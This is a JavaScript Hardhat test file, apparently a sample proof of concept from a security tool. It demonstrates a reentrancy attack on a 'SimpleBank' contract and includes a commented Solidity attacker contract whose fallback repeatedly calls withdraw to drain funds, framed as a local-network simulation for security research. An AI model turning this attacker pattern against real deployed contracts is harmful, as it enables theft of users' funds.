/**
 * EXAMPLE PROOF OF CONCEPT
 *
 * This is a pre-generated example showing the output format.
 * Run `scout poc` to generate PoCs for your findings.
 */

///////////////////////////// SAFETY NOTICE /////////////////////////////
//
// ⚠️  This is a SIMULATED exploit for security research purposes only
// ⚠️  All transactions are executed on a LOCAL FORK or TEST NETWORK
// ⚠️  NO funds are transferred on mainnet
//
// Usage:
//   npx hardhat test <this-file> --network hardhat
//
//////////////////////////////////////////////////////////////////////////

const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("SC-REENT-01: Reentrancy in withdraw()", function () {
  let simpleBank;
  let attacker;
  let victim;

  beforeEach(async function () {
    [owner, victim, attacker] = await ethers.getSigners();

    const SimpleBankFactory = await ethers.getContractFactory("SimpleBank");
    simpleBank = await SimpleBankFactory.deploy();
    await simpleBank.deployed();

    console.log("SimpleBank deployed at:", simpleBank.address);
  });

  it("should demonstrate reentrancy vulnerability", async function () {
    // Step 1: Victim deposits funds
    await simpleBank.connect(victim).deposit({ value: ethers.utils.parseEther("10") });
    console.log("✓ Victim deposited 10 ETH");

    // Step 2: Deploy attacker contract
    const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerFactory.connect(attacker).deploy(simpleBank.address);
    await attackerContract.deployed();

    // Step 3: Execute attack
    await attackerContract.attack({ value: ethers.utils.parseEther("1") });
    console.log("✓ Attack executed");

    // Step 4: Verify exploitation
    const attackerBalance = await ethers.provider.getBalance(attackerContract.address);
    console.log("Attacker final balance:", ethers.utils.formatEther(attackerBalance), "ETH");

    expect(attackerBalance).to.be.gt(ethers.utils.parseEther("1"));
    console.log("✓ Reentrancy vulnerability confirmed!");
  });

  after(function () {
    console.log("\n" + "=".repeat(60));
    console.log("⚠️  REMINDER: This PoC was executed in a SIMULATED environment");
    console.log("⚠️  NO actual funds were transferred or at risk");
    console.log("=".repeat(60));
  });
});

// Attacker contract (save as separate .sol file)
/*
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface ISimpleBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    ISimpleBank public bank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _bank) {
        bank = ISimpleBank(_bank);
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT);
        bank.deposit{value: ATTACK_AMOUNT}();
        bank.withdraw(ATTACK_AMOUNT);
    }

    receive() external payable {
        if (address(bank).balance >= ATTACK_AMOUNT) {
            bank.withdraw(ATTACK_AMOUNT);
        }
    }
}
*/
